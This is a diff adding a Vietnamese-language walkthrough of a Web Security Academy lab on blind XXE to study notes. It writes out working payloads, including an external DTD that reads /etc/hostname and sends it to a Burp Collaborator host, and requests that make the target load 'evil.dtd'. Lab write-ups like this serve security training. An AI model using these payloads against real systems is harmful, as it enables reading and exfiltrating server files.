@@ -250,6 +250,53 @@ Host: 0a4f00c0043e914981d0251e001f0036.web-security-academy.net
 - Khi gọi `entity xxe`, ứng dụng sẽ gửi request đến **Burp Collaborator**
 - Pool now để nhận request
 
+### Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
+- Đến 1 blog bất kỳ và sử dụng chức năng **check stock**
+- Gửi request **check stock** đến **Repeater**
+- Thay đổi request thành:
+
+```http
+POST /product/stock HTTP/2
+Host: 0a1f00d704dddf3e80eb3a20004a0097.web-security-academy.net
+...
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "your-burp-collaborator.oastify.com">
+%xxe;]>
+<stockCheck>
+    <productId>1</productId>
+    <storeId>1</storeId>
+</stockCheck>
+```
+- **Pool now** tại **Burp Collaborator** => có request đến => Có thể gửi dữ liệu ra bên ngoài
+- Đến **Exploit Server**, dán nội dung sau vào body:
+
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
+%eval;
+%exfil;
+```
+- Đổi đường dẫn thành `evil.dtd`
+- Gửi lại request với payload sau:
+
+```http
+POST /product/stock HTTP/2
+Host: 0a1f00d704dddf3e80eb3a20004a0097.web-security-academy.net
+...
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "https://exploit-0a55007d04b51db4809707b6016c0002.exploit-server.net/evil.dtd">
+%xxe;]>
+<stockCheck>
+    <productId>1</productId>
+    <storeId>1</storeId>
+</stockCheck>
+```
+- Đến **Burp Collaborator** > **Pool now**, lấy **hostname** từ request đến và submit
+
+### 
+
 ## Prevent
 --- 
 
